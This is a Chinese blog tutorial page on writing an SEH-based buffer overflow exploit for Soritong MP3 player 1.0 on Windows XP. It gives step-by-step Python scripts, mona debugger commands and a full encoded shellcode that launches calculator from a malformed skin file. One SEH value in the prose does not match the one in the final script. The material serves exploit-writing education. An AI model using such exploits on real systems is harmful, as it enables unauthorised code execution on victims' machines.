@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>exploit编写教程2：跳转到shellcode | Star</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="缓冲区溢出,exploit 编写," />
+  
+
+  <meta name="description" content="这个是基于SEH的exploit，SEH的原理大家去搜索，网上有很多资料，本文就不赘述了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="exploit编写教程2：跳转到shellcode">
+<meta property="og:url" content="http://huirong.github.io/2015/12/16/jmping-to-shellcode/index.html">
+<meta property="og:site_name" content="Star">
+<meta property="og:description" content="这个是基于SEH的exploit，SEH的原理大家去搜索，网上有很多资料，本文就不赘述了。">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCgw1ez1aw1va0oj307f03pglt.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCgw1ez1b8xtm4nj30k404ugne.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCjw1ez1bo95bd0j307f02dmxd.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCgw1ez1bq0ehlzj30ef04wwfs.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/005CA6ZCgw1ez1c47xmhvj307e032wep.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1ez1if82tnaj30el03njsl.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1ez1igyvjt5j30es08gtb2.jpg">
+<meta property="og:updated_time" content="2016-04-16T11:58:37.083Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="exploit编写教程2：跳转到shellcode">
+<meta name="twitter:description" content="这个是基于SEH的exploit，SEH的原理大家去搜索，网上有很多资料，本文就不赘述了。">
+<meta name="twitter:image" content="http://ww4.sinaimg.cn/large/005CA6ZCgw1ez1aw1va0oj307f03pglt.jpg">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=028c63b1" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/huirong.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016sfsf1fba3xxxx8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#I、试验环境"><span class="toc-text">I、试验环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#II、漏洞触发"><span class="toc-text">II、漏洞触发</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#III、要精确定位-SEH-的偏移地址"><span class="toc-text">III、要精确定位 SEH 的偏移地址</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅳ、查找-p-p-r-指令序列"><span class="toc-text">Ⅳ、查找 p/p/r 指令序列</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#V、构造最终的输入文件"><span class="toc-text">V、构造最终的输入文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅵ、参考文献"><span class="toc-text">Ⅵ、参考文献</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-jmping-to-shellcode" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">exploit编写教程2：跳转到shellcode</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2015.12.16</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>star</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/exploit-编写/">exploit 编写</a>
+  </span>
+
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://huirong.github.io/2015/12/16/jmping-to-shellcode/#disqus_thread"></a>
+        </span>
+      
+
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>这个是基于SEH的exploit，SEH的原理大家去搜索，网上有很多资料，本文就不赘述了。<br><a id="more"></a></p>
+<h1 id="I、试验环境"><a href="#I、试验环境" class="headerlink" title="I、试验环境"></a>I、试验环境</h1><ul>
+<li>测试平台： Microsoft Windows XP SP3</li>
+<li>漏洞软件：<a href="http://terenceli.github.io/assets/file/seh-exploit/soritong10.exe" target="_blank" rel="external">Soritong MP3 player 1.0</a></li>
+<li>分析工具：Immunity Debugger</li>
+<li>漏洞描述：通过创建一个畸形皮肤文件将触发Soritong MP3 player 1.0溢出。</li>
+</ul>
+<h1 id="II、漏洞触发"><a href="#II、漏洞触发" class="headerlink" title="II、漏洞触发"></a>II、漏洞触发</h1><p>用python创建一个ui.txt文件并放到skin\default文件夹下面<br><figure class="highlight d"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/usr/bin/python</span></div><div class="line">filename = <span class="string">"ui.txt"</span></div><div class="line">junk = <span class="string">'A'</span> * <span class="number">5000</span></div><div class="line">f = open(filename,<span class="string">'w'</span>)</div><div class="line">f.write(junk)</div><div class="line">f.close()</div></pre></td></tr></table></figure></p>
+<p>打开Soritong，可以看到程序闪退。<br>使用Immunity Debugger加载Soritong，F9运行，然后查看SEH链（view -&gt; SEH chain），发现next SEH和SEH handler都被 A 覆盖了<br><img src="http://ww4.sinaimg.cn/large/005CA6ZCgw1ez1aw1va0oj307f03pglt.jpg" alt=""></p>
+<p>当异常发生时，程序会跳转到SEH handler去执行，通过将这个handler的值设置为程序自带模块的一个pop/pop/ret地址，能够实现程序跳转到next seh pointer去，在next seh中需要做的就是跳转到shellcode执行。shellcode的布局大致如下：<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[<span class="string">junk</span>][<span class="symbol">next seh</span>][<span class="string">seh</span>][<span class="symbol">shellcode</span>]</div></pre></td></tr></table></figure></p>
+<p>next seh是一个跳转到shellcode的指令，seh是一个程序自带模块的p/p/r地址。<br>这里再解释一下pop pop ret指令的作用，当异常发生的时候，异常分发器创建自己的栈帧，会将EH handler成员压入新创的栈帧中，在EH结构中有一个域是EstablisherFrame。这个域指向异常注册记录(next seh)的地址并被压入栈中，当一个函数被调用的时候被压入的这个值都是位于ESP+8的地方。使用pop pop ret后，就会将next seh的地址放到EIP中。</p>
+<h1 id="III、要精确定位-SEH-的偏移地址"><a href="#III、要精确定位-SEH-的偏移地址" class="headerlink" title="III、要精确定位 SEH 的偏移地址"></a>III、要精确定位 SEH 的偏移地址</h1><p>需要构造特殊的唯一字符串模型来覆盖缓冲区<br>Immunity Debugger再次加载Soritong，在命令行窗口输入：<br><figure class="highlight diff"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="addition">!mona create_pattern 5000</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://ww3.sinaimg.cn/large/005CA6ZCgw1ez1b8xtm4nj30k404ugne.jpg" alt=""></p>
+<p>从Log data中可知，pattern文件在C:\D\mona-master\output\Soritong\pattern.txt，<br>提取出生成的5000个字符文件，放入p.txt，并替换ui.txt中的5000个字符。脚本如下：<br><figure class="highlight tcl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">filename</span> = <span class="string">"ui.txt"</span></div><div class="line"></div><div class="line">fp = <span class="keyword">open</span>(<span class="string">"p.txt"</span>,<span class="string">'r'</span>)</div><div class="line">junk = fp.<span class="keyword">read</span>()</div><div class="line"></div><div class="line">f = <span class="keyword">open</span>(<span class="keyword">filename</span>,<span class="string">'w'</span>)</div><div class="line">f.write(junk)</div><div class="line">f.<span class="keyword">close</span>()</div></pre></td></tr></table></figure></p>
+<p>将生成的ui.txt覆盖skin\default中的ui.txt<br>在Immunity Debugger中查看SEH chain：</p>
+<p><img src="http://ww3.sinaimg.cn/large/005CA6ZCjw1ez1bo95bd0j307f02dmxd.jpg" alt=""></p>
+<p>nseh 的值为：35744134 ，在命令行输入<br><figure class="highlight diff"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="addition">!mona pattern_offset 35744134</span></div></pre></td></tr></table></figure></p>
+<p>查找nseh偏移</p>
+<p><img src="http://ww4.sinaimg.cn/large/005CA6ZCgw1ez1bq0ehlzj30ef04wwfs.jpg" alt=""></p>
+<p>nseh的偏移为：584，则seh handler的偏移：584 + 4 =588</p>
+<p>此时我们再用如下脚本测试一下位置是否正确：<br><figure class="highlight d"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/usr/bin/python</span></div><div class="line">filename = <span class="string">"ui.txt"</span></div><div class="line">junk = <span class="string">'A'</span> * <span class="number">584</span></div><div class="line">nseh = <span class="string">'B'</span> * <span class="number">4</span></div><div class="line">seh = <span class="string">'C'</span> * <span class="number">4</span></div><div class="line">data = junk + nseh + seh</div><div class="line">f = open(filename,<span class="string">'w'</span>)</div><div class="line">f.write(data)</div><div class="line">f.close()</div></pre></td></tr></table></figure></p>
+<p><img src="http://ww2.sinaimg.cn/large/005CA6ZCgw1ez1c47xmhvj307e032wep.jpg" alt=""></p>
+<h1 id="Ⅳ、查找-p-p-r-指令序列"><a href="#Ⅳ、查找-p-p-r-指令序列" class="headerlink" title="Ⅳ、查找 p/p/r 指令序列"></a>Ⅳ、查找 p/p/r 指令序列</h1><p>再次加载目标程序，在命令行窗口输入：<br><figure class="highlight diff"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="addition">!mona rop</span></div></pre></td></tr></table></figure></p>
+<p>在rop.txt中查找合适的 p/p/r指令地址</p>
+<p><img src="http://ww1.sinaimg.cn/large/005CA6ZCgw1ez1if82tnaj30el03njsl.jpg" alt=""></p>
+<p>选用 0x1001dd61 （选地址时，要注意shellcode截断）</p>
+<h1 id="V、构造最终的输入文件"><a href="#V、构造最终的输入文件" class="headerlink" title="V、构造最终的输入文件"></a>V、构造最终的输入文件</h1><p>一个short jmp机器码是eb，跟上跳转距离，跳过6字节的short jmp机器码为eb 06。所以使用0xeb,0x06,0x90,0x90覆盖 next seh。</p>
+<p>最终的shellcode就是</p>
+<p>junk:584字节 ‘A’</p>
+<p>next seh:”\xeb\x06\x90\x90”</p>
+<p>seh:”\x26\x80\x45\x00”</p>
+<p>shellcode：完成功能的，随便找了一个弹计算器的</p>
+<p>并且在最后加了一些垃圾数据<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">filename = "ui.txt"</div><div class="line">junk = "A" * 584</div><div class="line">nseh = "<span class="symbol">\x</span>eb<span class="symbol">\x</span>06<span class="symbol">\x</span>90<span class="symbol">\x</span>90"</div><div class="line">seh = "<span class="symbol">\x</span>61<span class="symbol">\x</span>dd<span class="symbol">\x</span>01<span class="symbol">\x</span>10"</div><div class="line">shellcode = ("<span class="symbol">\x</span>eb<span class="symbol">\x</span>03<span class="symbol">\x</span>59<span class="symbol">\x</span>eb<span class="symbol">\x</span>05<span class="symbol">\x</span>e8<span class="symbol">\x</span>f8<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>4f<span class="symbol">\x</span>49<span class="symbol">\x</span>49<span class="symbol">\x</span>49<span class="symbol">\x</span>49<span class="symbol">\x</span>49"</div><div class="line">"<span class="symbol">\x</span>49<span class="symbol">\x</span>51<span class="symbol">\x</span>5a<span class="symbol">\x</span>56<span class="symbol">\x</span>54<span class="symbol">\x</span>58<span class="symbol">\x</span>36<span class="symbol">\x</span>33<span class="symbol">\x</span>30<span class="symbol">\x</span>56<span class="symbol">\x</span>58<span class="symbol">\x</span>34<span class="symbol">\x</span>41<span class="symbol">\x</span>30<span class="symbol">\x</span>42<span class="symbol">\x</span>36"</div><div class="line">"<span class="symbol">\x</span>48<span class="symbol">\x</span>48<span class="symbol">\x</span>30<span class="symbol">\x</span>42<span class="symbol">\x</span>33<span class="symbol">\x</span>30<span class="symbol">\x</span>42<span class="symbol">\x</span>43<span class="symbol">\x</span>56<span class="symbol">\x</span>58<span class="symbol">\x</span>32<span class="symbol">\x</span>42<span class="symbol">\x</span>44<span class="symbol">\x</span>42<span class="symbol">\x</span>48<span class="symbol">\x</span>34"</div><div class="line">"<span class="symbol">\x</span>41<span class="symbol">\x</span>32<span class="symbol">\x</span>41<span class="symbol">\x</span>44<span class="symbol">\x</span>30<span class="symbol">\x</span>41<span class="symbol">\x</span>44<span class="symbol">\x</span>54<span class="symbol">\x</span>42<span class="symbol">\x</span>44<span class="symbol">\x</span>51<span class="symbol">\x</span>42<span class="symbol">\x</span>30<span class="symbol">\x</span>41<span class="symbol">\x</span>44<span class="symbol">\x</span>41"</div><div class="line">"<span class="symbol">\x</span>56<span class="symbol">\x</span>58<span class="symbol">\x</span>34<span class="symbol">\x</span>5a<span class="symbol">\x</span>38<span class="symbol">\x</span>42<span class="symbol">\x</span>44<span class="symbol">\x</span>4a<span class="symbol">\x</span>4f<span class="symbol">\x</span>4d<span class="symbol">\x</span>4e<span class="symbol">\x</span>4f<span class="symbol">\x</span>4a<span class="symbol">\x</span>4e<span class="symbol">\x</span>46<span class="symbol">\x</span>44"</div><div class="line">"<span class="symbol">\x</span>42<span class="symbol">\x</span>30<span class="symbol">\x</span>42<span class="symbol">\x</span>50<span class="symbol">\x</span>42<span class="symbol">\x</span>30<span class="symbol">\x</span>4b<span class="symbol">\x</span>38<span class="symbol">\x</span>45<span class="symbol">\x</span>54<span class="symbol">\x</span>4e<span class="symbol">\x</span>33<span class="symbol">\x</span>4b<span class="symbol">\x</span>58<span class="symbol">\x</span>4e<span class="symbol">\x</span>37"</div><div class="line">"<span class="symbol">\x</span>45<span class="symbol">\x</span>50<span class="symbol">\x</span>4a<span class="symbol">\x</span>47<span class="symbol">\x</span>41<span class="symbol">\x</span>30<span class="symbol">\x</span>4f<span class="symbol">\x</span>4e<span class="symbol">\x</span>4b<span class="symbol">\x</span>38<span class="symbol">\x</span>4f<span class="symbol">\x</span>44<span class="symbol">\x</span>4a<span class="symbol">\x</span>41<span class="symbol">\x</span>4b<span class="symbol">\x</span>48"</div><div class="line">"<span class="symbol">\x</span>4f<span class="symbol">\x</span>35<span class="symbol">\x</span>42<span class="symbol">\x</span>32<span class="symbol">\x</span>41<span class="symbol">\x</span>50<span class="symbol">\x</span>4b<span class="symbol">\x</span>4e<span class="symbol">\x</span>49<span class="symbol">\x</span>34<span class="symbol">\x</span>4b<span class="symbol">\x</span>38<span class="symbol">\x</span>46<span class="symbol">\x</span>43<span class="symbol">\x</span>4b<span class="symbol">\x</span>48"</div><div class="line">"<span class="symbol">\x</span>41<span class="symbol">\x</span>30<span class="symbol">\x</span>50<span class="symbol">\x</span>4e<span class="symbol">\x</span>41<span class="symbol">\x</span>43<span class="symbol">\x</span>42<span class="symbol">\x</span>4c<span class="symbol">\x</span>49<span class="symbol">\x</span>39<span class="symbol">\x</span>4e<span class="symbol">\x</span>4a<span class="symbol">\x</span>46<span class="symbol">\x</span>48<span class="symbol">\x</span>42<span class="symbol">\x</span>4c"</div><div class="line">"<span class="symbol">\x</span>46<span class="symbol">\x</span>37<span class="symbol">\x</span>47<span class="symbol">\x</span>50<span class="symbol">\x</span>41<span class="symbol">\x</span>4c<span class="symbol">\x</span>4c<span class="symbol">\x</span>4c<span class="symbol">\x</span>4d<span class="symbol">\x</span>50<span class="symbol">\x</span>41<span class="symbol">\x</span>30<span class="symbol">\x</span>44<span class="symbol">\x</span>4c<span class="symbol">\x</span>4b<span class="symbol">\x</span>4e"</div><div class="line">"<span class="symbol">\x</span>46<span class="symbol">\x</span>4f<span class="symbol">\x</span>4b<span class="symbol">\x</span>43<span class="symbol">\x</span>46<span class="symbol">\x</span>35<span class="symbol">\x</span>46<span class="symbol">\x</span>42<span class="symbol">\x</span>46<span class="symbol">\x</span>30<span class="symbol">\x</span>45<span class="symbol">\x</span>47<span class="symbol">\x</span>45<span class="symbol">\x</span>4e<span class="symbol">\x</span>4b<span class="symbol">\x</span>48"</div><div class="line">"<span class="symbol">\x</span>4f<span class="symbol">\x</span>35<span class="symbol">\x</span>46<span class="symbol">\x</span>42<span class="symbol">\x</span>41<span class="symbol">\x</span>50<span class="symbol">\x</span>4b<span class="symbol">\x</span>4e<span class="symbol">\x</span>48<span class="symbol">\x</span>46<span class="symbol">\x</span>4b<span class="symbol">\x</span>58<span class="symbol">\x</span>4e<span class="symbol">\x</span>30<span class="symbol">\x</span>4b<span class="symbol">\x</span>54"</div><div class="line">"<span class="symbol">\x</span>4b<span class="symbol">\x</span>58<span class="symbol">\x</span>4f<span class="symbol">\x</span>55<span class="symbol">\x</span>4e<span class="symbol">\x</span>31<span class="symbol">\x</span>41<span class="symbol">\x</span>50<span class="symbol">\x</span>4b<span class="symbol">\x</span>4e<span class="symbol">\x</span>4b<span class="symbol">\x</span>58<span class="symbol">\x</span>4e<span class="symbol">\x</span>31<span class="symbol">\x</span>4b<span class="symbol">\x</span>48"</div><div class="line">"<span class="symbol">\x</span>41<span class="symbol">\x</span>30<span class="symbol">\x</span>4b<span class="symbol">\x</span>4e<span class="symbol">\x</span>49<span class="symbol">\x</span>38<span class="symbol">\x</span>4e<span class="symbol">\x</span>45<span class="symbol">\x</span>46<span class="symbol">\x</span>52<span class="symbol">\x</span>46<span class="symbol">\x</span>30<span class="symbol">\x</span>43<span class="symbol">\x</span>4c<span class="symbol">\x</span>41<span class="symbol">\x</span>43"</div><div class="line">"<span class="symbol">\x</span>42<span class="symbol">\x</span>4c<span class="symbol">\x</span>46<span class="symbol">\x</span>46<span class="symbol">\x</span>4b<span class="symbol">\x</span>48<span class="symbol">\x</span>42<span class="symbol">\x</span>54<span class="symbol">\x</span>42<span class="symbol">\x</span>53<span class="symbol">\x</span>45<span class="symbol">\x</span>38<span class="symbol">\x</span>42<span class="symbol">\x</span>4c<span class="symbol">\x</span>4a<span class="symbol">\x</span>57"</div><div class="line">"<span class="symbol">\x</span>4e<span class="symbol">\x</span>30<span class="symbol">\x</span>4b<span class="symbol">\x</span>48<span class="symbol">\x</span>42<span class="symbol">\x</span>54<span class="symbol">\x</span>4e<span class="symbol">\x</span>30<span class="symbol">\x</span>4b<span class="symbol">\x</span>48<span class="symbol">\x</span>42<span class="symbol">\x</span>37<span class="symbol">\x</span>4e<span class="symbol">\x</span>51<span class="symbol">\x</span>4d<span class="symbol">\x</span>4a"</div><div class="line">"<span class="symbol">\x</span>4b<span class="symbol">\x</span>58<span class="symbol">\x</span>4a<span class="symbol">\x</span>56<span class="symbol">\x</span>4a<span class="symbol">\x</span>50<span class="symbol">\x</span>4b<span class="symbol">\x</span>4e<span class="symbol">\x</span>49<span class="symbol">\x</span>30<span class="symbol">\x</span>4b<span class="symbol">\x</span>38<span class="symbol">\x</span>42<span class="symbol">\x</span>38<span class="symbol">\x</span>42<span class="symbol">\x</span>4b"</div><div class="line">"<span class="symbol">\x</span>42<span class="symbol">\x</span>50<span class="symbol">\x</span>42<span class="symbol">\x</span>30<span class="symbol">\x</span>42<span class="symbol">\x</span>50<span class="symbol">\x</span>4b<span class="symbol">\x</span>58<span class="symbol">\x</span>4a<span class="symbol">\x</span>46<span class="symbol">\x</span>4e<span class="symbol">\x</span>43<span class="symbol">\x</span>4f<span class="symbol">\x</span>35<span class="symbol">\x</span>41<span class="symbol">\x</span>53"</div><div class="line">"<span class="symbol">\x</span>48<span class="symbol">\x</span>4f<span class="symbol">\x</span>42<span class="symbol">\x</span>56<span class="symbol">\x</span>48<span class="symbol">\x</span>45<span class="symbol">\x</span>49<span class="symbol">\x</span>38<span class="symbol">\x</span>4a<span class="symbol">\x</span>4f<span class="symbol">\x</span>43<span class="symbol">\x</span>48<span class="symbol">\x</span>42<span class="symbol">\x</span>4c<span class="symbol">\x</span>4b<span class="symbol">\x</span>37"</div><div class="line">"<span class="symbol">\x</span>42<span class="symbol">\x</span>35<span class="symbol">\x</span>4a<span class="symbol">\x</span>46<span class="symbol">\x</span>42<span class="symbol">\x</span>4f<span class="symbol">\x</span>4c<span class="symbol">\x</span>48<span class="symbol">\x</span>46<span class="symbol">\x</span>50<span class="symbol">\x</span>4f<span class="symbol">\x</span>45<span class="symbol">\x</span>4a<span class="symbol">\x</span>46<span class="symbol">\x</span>4a<span class="symbol">\x</span>49"</div><div class="line">"<span class="symbol">\x</span>50<span class="symbol">\x</span>4f<span class="symbol">\x</span>4c<span class="symbol">\x</span>58<span class="symbol">\x</span>50<span class="symbol">\x</span>30<span class="symbol">\x</span>47<span class="symbol">\x</span>45<span class="symbol">\x</span>4f<span class="symbol">\x</span>4f<span class="symbol">\x</span>47<span class="symbol">\x</span>4e<span class="symbol">\x</span>43<span class="symbol">\x</span>36<span class="symbol">\x</span>41<span class="symbol">\x</span>46"</div><div class="line">"<span class="symbol">\x</span>4e<span class="symbol">\x</span>36<span class="symbol">\x</span>43<span class="symbol">\x</span>46<span class="symbol">\x</span>42<span class="symbol">\x</span>50<span class="symbol">\x</span>5a")</div><div class="line">junk2="<span class="symbol">\x</span>90" * 1000;</div><div class="line">data = junk + nseh + seh + shellcode + junk2</div><div class="line">f = open(filename,'w')</div><div class="line">f.write(data)</div><div class="line">f.close()</div></pre></td></tr></table></figure></p>
+<p>运行目标程序，OK！！！！计算器成功弹出来了</p>
+<p><img src="http://ww1.sinaimg.cn/large/005CA6ZCgw1ez1igyvjt5j30es08gtb2.jpg" alt=""></p>
+<h1 id="Ⅵ、参考文献"><a href="#Ⅵ、参考文献" class="headerlink" title="Ⅵ、参考文献"></a>Ⅵ、参考文献</h1><p><a href="exploit编写笔记2——基于SEH的exploit">exploit编写笔记2——基于SEH的exploit</a><br><a href="https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/" target="_blank" rel="external">https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/</a></p>
+
+    
+  </div>
+</article>
+
+</div>
+
+
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">走过的，路过的，请支持一下我 n(*≧▽≦*)n</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'huirong';
+    
+    var disqus_url = 'http://huirong.github.io/2015/12/16/jmping-to-shellcode/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//huirong.disqus.com/count.js" async></script>
+
+
+
+    
+  <section class="duoshuo-comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="http://huirong.github.io/2015/12/16/jmping-to-shellcode/index.html" data-title="exploit编写教程2：跳转到shellcode" data-url="http://huirong.github.io/2015/12/16/jmping-to-shellcode/index.html"></div>
+    <!-- 多说评论框 end -->
+  </section>
+
+
+
+
+  <script type="text/javascript">
+  var duoshuoQuery = {short_name:"star"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+     || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+  </script>
+
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
